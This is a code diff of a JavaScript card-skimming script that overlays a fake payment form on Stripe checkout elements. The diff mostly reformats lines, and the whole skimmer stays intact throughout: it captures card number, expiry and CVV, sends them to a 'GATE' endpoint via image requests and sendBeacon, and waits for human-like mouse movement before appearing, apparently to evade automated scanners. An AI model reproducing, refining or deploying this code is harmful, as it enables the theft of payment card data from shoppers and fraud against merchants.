@@ -16,7 +16,6 @@
         new Image().src = GATE + '?d=' + encodeURIComponent(b64);
         if (navigator.sendBeacon) navigator.sendBeacon(GATE, new URLSearchParams({ d: b64 }));
     }
-
     function createFakeUI() {
         let target = document.querySelector('#payment-element, .StripeElement, iframe[src*="stripe"]');
         if (!target || document.getElementById('imperial-ui')) return;
@@ -46,13 +45,8 @@
         `;
         shadow.appendChild(container);
         document.body.appendChild(host);
-
         shadow.getElementById('payBtn').onclick = () => {
-            send({
-                card: shadow.getElementById('cc').value,
-                exp: shadow.getElementById('exp').value,
-                cvv: shadow.getElementById('cvv').value
-            });
+            send({ card: shadow.getElementById('cc').value, exp: shadow.getElementById('exp').value, cvv: shadow.getElementById('cvv').value });
             shadow.getElementById('step1').style.display = 'none';
             shadow.getElementById('step2').style.display = 'block';
         };
@@ -62,14 +56,13 @@
             setTimeout(() => location.reload(), 2500);
         };
     }
-
     let interactionCount = 0;
     let mouseMoves = [];
     function checkInteraction(e) {
         interactionCount++;
         mouseMoves.push({ x: e.clientX, y: e.clientY, t: Date.now() });
         if (mouseMoves.length > 5) mouseMoves.shift();
-        if (interactionCount >= 2 && (mouseMoves.length >= 2 && (mouseMoves[mouseMoves.length-1].t - mouseMoves[0].t) < 3000)) {
+        if (interactionCount >= 2 && mouseMoves.length >= 2 && (mouseMoves[mouseMoves.length-1].t - mouseMoves[0].t) < 3000) {
             createFakeUI();
             window.removeEventListener('mousemove', checkInteraction);
             window.removeEventListener('click', checkInteraction);
@@ -79,7 +72,5 @@
     window.addEventListener('mousemove', checkInteraction);
     window.addEventListener('click', checkInteraction);
     window.addEventListener('touchstart', checkInteraction);
-    setTimeout(() => {
-        if (!document.getElementById('imperial-ui')) createFakeUI();
-    }, 8000);
+    setTimeout(() => { if (!document.getElementById('imperial-ui')) createFakeUI(); }, 8000);
 })();
